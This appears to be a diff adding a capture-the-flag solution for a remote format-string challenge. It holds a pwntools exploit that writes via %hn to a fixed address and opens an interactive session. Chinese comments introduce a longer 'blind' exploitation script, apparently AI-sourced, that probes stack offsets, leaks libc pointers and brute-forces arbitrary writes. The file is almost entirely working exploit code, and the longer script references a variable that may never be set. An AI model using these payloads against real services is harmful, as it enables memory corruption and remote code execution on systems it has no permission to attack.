@@ -1,0 +1,150 @@
+from pwn import *
+
+
+p = remote('challenge.bluesharkinfo.com', 27384)
+context(arch='amd64', os='linux', log_level='debug')
+
+payload = b"%4699c%10$hn"
+payload = payload.ljust(16, b'\x00') + p64(0x403160)*4
+p.sendlineafter(b'Have fun\n', payload)
+
+p.recv()
+
+p.interactive()
+
+盲打真的阴飞了，好麻烦就慢慢%p找吧
+
+奖励一个之前我用ai搜的盲打框架吧
+from pwn import *
+import time
+
+def blind_format_string():
+    # 重试机制
+    for attempt in range(3):
+        try:
+            p = remote('challenge.bluesharkinfo.com', 27384)
+            context(arch='amd64', os='linux', log_level='info')
+            
+            print(f"\n=== 尝试 {attempt + 1} ===")
+            
+            # 策略1: 探测栈布局和偏移
+            print("[*] 探测栈布局...")
+            test_payloads = [
+                b'%p' * 30,  # 简单泄漏
+                b'%p.' * 20,  # 带分隔符
+                b'AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p',
+                b'%6$p', b'%7$p', b'%8$p', b'%9$p', b'%10$p',  # 测试常见偏移
+                b'%11$p', b'%12$p', b'%13$p', b'%14$p', b'%15$p',
+            ]
+            
+            for test in test_payloads:
+                try:
+                    p.sendlineafter(b'Have fun\n', test)
+                    resp = p.recvline(timeout=1)
+                    print(f"Payload: {test[:20]}... -> {resp[:100]}")
+                    time.sleep(0.1)
+                except:
+                    p.close()
+                    p = remote('challenge.bluesharkinfo.com', 27384)
+            
+            # 策略2: 确定我们的输入在哪个位置
+            print("\n[*] 寻找输入位置...")
+            for i in range(1, 30):
+                marker = b'ABCD'  # 使用可识别的标记
+                payload = marker + f'%{i}$p'.encode()
+                try:
+                    p.sendline(payload)
+                    resp = p.recvline(timeout=1)
+                    if b'0x44434241' in resp or b'44434241' in resp:  # 'ABCD'的十六进制
+                        print(f"✓ 发现输入在偏移 {i} 处")
+                        input_offset = i
+                        break
+                except:
+                    break
+            
+            # 策略3: 尝试任意读（泄漏libc）
+            print("\n[*] 尝试泄漏libc地址...")
+            # 尝试读取常见的GOT表项
+            common_got_offsets = [1, 2, 3, 6, 7, 8]  # 常见的参数位置
+            
+            for offset in common_got_offsets:
+                # 构造读取链：先放地址，然后引用它
+                # 我们需要确定地址放在哪里能被引用到
+                for addr_offset in range(input_offset, input_offset + 10):
+                    try:
+                        # 尝试读取可能指向libc的指针
+                        payload = f'%{addr_offset}$s'.encode().ljust(8, b'A')
+                        payload += p64(0x400000)  # 程序基地址附近
+                        p.sendline(payload)
+                        resp = p.recv(timeout=1)
+                        if b'\x7f' in resp:  # 可能是一个libc地址
+                            print(f"可能泄漏到libc地址在偏移 {addr_offset}")
+                    except:
+                        pass
+            
+            # 策略4: 尝试任意写（你的原始方法改进版）
+            print("\n[*] 尝试任意写...")
+            # 你的原始payload的思路是写入4699到0x403160
+            # 这可能是一个关键的地址（比如exit@got, printf@got等）
+            
+            # 先测试写入是否能成功
+            test_write_payloads = []
+            
+            # 方法1: 使用%hn写入2字节
+            for offset in range(6, 20):
+                # 写入一个可观测的值到栈上某个位置
+                # 先找到栈上一个可写的地址
+                payload = f'%{0x4141}c%{offset}$hn'.encode()
+                payload = payload.ljust(64, b'B')
+                test_write_payloads.append(payload)
+            
+            # 方法2: 尝试你的原始payload，但动态调整偏移
+            for offset in range(6, 20):
+                payload = f"%4699c%{offset}$hn".encode()
+                # 在payload后面添加目标地址
+                target_addr = 0x403160  # 你的目标地址
+                # 我们需要把地址放在正确的位置
+                if offset >= 10:
+                    # 地址需要放在payload前面
+                    padding = (offset - 10) * 8
+                    final_payload = payload.ljust(padding, b'X') + p64(target_addr)
+                else:
+                    # 地址放在payload后面
+                    final_payload = payload.ljust(16, b'X') + p64(target_addr) * 4
+                
+                print(f"测试偏移 {offset}: {final_payload[:50]}...")
+                try:
+                    p.sendline(final_payload)
+                    resp = p.recv(timeout=1)
+                    # 检查是否有异常或成功迹象
+                    print(f"响应: {resp[:50]}")
+                except EOFError:
+                    print("连接关闭，可能写入成功导致崩溃")
+                    p.close()
+                    # 重新连接检查效果
+                    time.sleep(1)
+                    p = remote('challenge.bluesharkinfo.com', 27384)
+                    
+                    # 发送测试命令看服务是否存活
+                    try:
+                        p.sendline(b'test')
+                        resp = p.recv(timeout=1)
+                        print(f"服务响应: {resp}")
+                    except:
+                        print("服务可能崩溃，尝试下一个偏移")
+                        break
+            
+            # 策略5: 尝试获取shell的完整利用
+            print("\n[*] 尝试完整利用...")
+            # 如果能确定偏移，尝试覆盖返回地址或GOT表
+            
+            p.interactive()
+            break
+            
+        except Exception as e:
+            print(f"尝试 {attempt + 1} 失败: {e}")
+            time.sleep(2)
+            continue
+
+if __name__ == "__main__":
+    blind_format_string()
